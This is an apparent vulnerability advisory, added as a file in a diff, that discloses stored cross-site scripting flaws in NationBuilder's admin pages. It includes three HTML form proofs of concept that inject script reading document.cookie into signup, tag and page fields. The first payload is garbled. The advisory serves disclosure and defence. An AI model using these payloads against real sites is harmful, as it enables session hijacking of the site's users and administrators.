@@ -1,0 +1,104 @@
+﻿<!--
+
+
+NationBuilder Multiple Stored XSS Vulnerabilities
+
+
+Vendor: NATIONBUILDER WHQ
+Product web page: http://www.nationbuilder.com
+Affected version: unknown
+Platform: Ruby
+
+Summary: NationBuilder is a unique nonpartisan community
+organizing system that brings together a comprehensive
+suite of tools that today's leaders and creators need to
+gather their tribes. Deeply social.
+
+Desc: The application suffers from multiple stored XSS
+vulnerabilities. Input passed to several POST parameters
+is not properly sanitised before being returned to the
+user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context
+of an affected site.
+
+Tested on: Apache/2.2.22 (Ubuntu)
+           Phusion Passenger 4.0.48
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5318
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5318.php
+
+Ruby client for NationBuilder API:
+https://github.com/nationbuilder/nationbuilder-rb
+
+
+11.04.2016
+
+-->
+
+
+#1 Stored XSS in 'signup[note]' POST parameter
+----------------------------------------------
+#
+#  PoC:
+#
+
+<html>
+  <body>
+    <form action="https://domain.local/admin/signups/2/background?screen=signup-header" method="POST">
+      <input type="hidden" name="utf8" value="%E2%9C%93" />
+      <input type="hidden" name="authenticity_token" value="0ch5v8vyarO/yzmWoLWtOKBVpOjVVaQe/V8yg5jfNO8=" />
+      <input type="hidden" name="signup[note]" value="<script>alert(onfirm(document.cookie)</script>" />
+      <input type="hidden" name="commit" value="Save background" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+
+#2 Stored XSS in 'page_tag[name]' POST parameter
+------------------------------------------------
+#
+#  PoC:
+#
+
+<html>
+  <body>
+    <form action="https://domain.local/admin/sites/1/tags" method="POST">
+      <input type="hidden" name="utf8" value="%E2%9C%93" />
+      <input type="hidden" name="authenticity_token" value="0ch5v8vyarO/yzmWoLWtOKBVpOjVVaQe/V8yg5jfNO8=" />
+      <input type="hidden" name="page_tag[name]" value="<script>confirm(document.cookie)</script>" />
+      <input type="hidden" name="commit" value="Add tag" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+
+#3 Stored XSS in 'page[slug]' and 'page[headline]' POST parameters
+------------------------------------------------------------------
+#
+#  PoC:
+#
+
+<html>
+  <body>
+    <form action="https://domain.local/admin/sites/1/pages/12?screen=seo" method="POST">
+      <input type="hidden" name="utf8" value="â" />
+      <input type="hidden" name="_method" value="put" />
+      <input type="hidden" name="authenticity_token" value="wAqOhULjnK8/H3ip+zE6yg3IHaGa6ggbjxOoN2tf30I=" />
+      <input type="hidden" name="page[title]" value="Volunteer - ZSL" />
+      <input type="hidden" name="page[slug]" value="volunteer_script_confirm_document_cookie_script" />
+      <input type="hidden" name="page[headline]" value="Volunteer<script>confirm(document.cookie)</script>" />
+      <input type="hidden" name="page[excerpt]" value="1" />
+      <input type="hidden" name="commit" value="Save page" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
